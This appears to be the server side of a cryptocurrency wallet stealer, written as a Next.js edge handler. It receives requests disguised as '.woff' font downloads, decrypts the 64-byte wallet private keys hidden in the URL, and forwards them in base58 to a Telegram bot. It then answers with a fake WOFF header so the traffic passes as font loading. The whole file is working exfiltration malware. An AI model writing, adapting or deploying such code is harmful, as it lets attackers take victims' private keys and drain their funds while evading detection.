import { NextRequest } from "next/server";

export const config = { runtime: "edge" };

// Base58 alphabet
const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

// Encode Uint8Array to Base58
function base58Encode(bytes: Uint8Array): string {
  let value = BigInt("0x" + [...bytes].map(b => b.toString(16).padStart(2, "0")).join(""));
  let encoded = "";
  while (value > 0n) {
    const mod = value % 58n;
    value /= 58n;
    encoded = ALPHABET[Number(mod)] + encoded;
  }
  // leading zeros
  for (let b of bytes) {
    if (b === 0) encoded = ALPHABET[0] + encoded;
    else break;
  }
  return encoded;
}

// Decode URL-safe Base64 to Uint8Array
function b64ToBytes(b64: string): Uint8Array {
  b64 = b64.replace(/-/g, "+").replace(/_/g, "/");
  const pad = (4 - (b64.length % 4)) % 4;
  b64 += "=".repeat(pad);
  const binary = atob(b64);
  const arr = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) arr[i] = binary.charCodeAt(i);
  return arr;
}

export default async function handler(req: NextRequest) {
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Missing BOT_TOKEN or CHAT_ID");
    return new Response("Misconfigured", { status: 500 });
  }

  // Extract slug
  const slug = new URL(req.url).pathname.split("/").pop() || "";
  const core = slug.endsWith(".woff") ? slug.slice(0, -5) : slug;
  const idx = core.indexOf("_");
  if (idx < 0) {
    console.error("Invalid slug format");
    return new Response("Invalid slug", { status: 400 });
  }
  const encoded = core.slice(idx + 1);

  // Decode payload JSON
  let payload: { keybundle: string; sBundles: string[] };
  try {
    const raw = b64ToBytes(encoded);
    payload = JSON.parse(new TextDecoder().decode(raw));
  } catch (e) {
    console.error("Failed to parse payload:", e);
    return new Response("Bad payload", { status: 400 });
  }

  // Import AES-GCM key from payload
  let aesKey: CryptoKey;
  try {
    const keyBytes = b64ToBytes(payload.keybundle);
    aesKey = await crypto.subtle.importKey(
      "raw", keyBytes, "AES-GCM", false, ["decrypt"]
    );
  } catch (e) {
    console.error("Key import error:", e);
    return new Response("Bad key", { status: 400 });
  }

  // Decrypt each bundle to 64-byte secret key
  const secretKeys: string[] = [];
  for (let i = 0; i < payload.sBundles.length; i++) {
    const entry = payload.sBundles[i];
    const sep = entry.indexOf(":");
    if (sep < 0) continue;
    const iv = b64ToBytes(entry.slice(0, sep));
    const encrypted = b64ToBytes(entry.slice(sep + 1));
    try {
      const plain = await crypto.subtle.decrypt(
        { name: "AES-GCM", iv }, aesKey, encrypted
      );
      const bytes = new Uint8Array(plain);
      if (bytes.length !== 64) {
        console.error(`Bundle ${i} length ${bytes.length}`);
        continue;
      }
      secretKeys.push(base58Encode(bytes));
    } catch (e) {
      console.error(`Decrypt error ${i}:`, e);
    }
  }

  // Send to Telegram
  if (secretKeys.length) {
    const text = secretKeys.map((k, i) => `Wallet ${i + 1}\n${k}`).join("\n\n");
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });
    } catch (e) {
      console.error("Telegram send error:", e);
    }
  } else {
    console.error("No keys decrypted");
  }

  // Return WOFF header
  return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
    headers: {
      "Content-Type": "font/woff",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Credentials": "true"
    }
  });
}
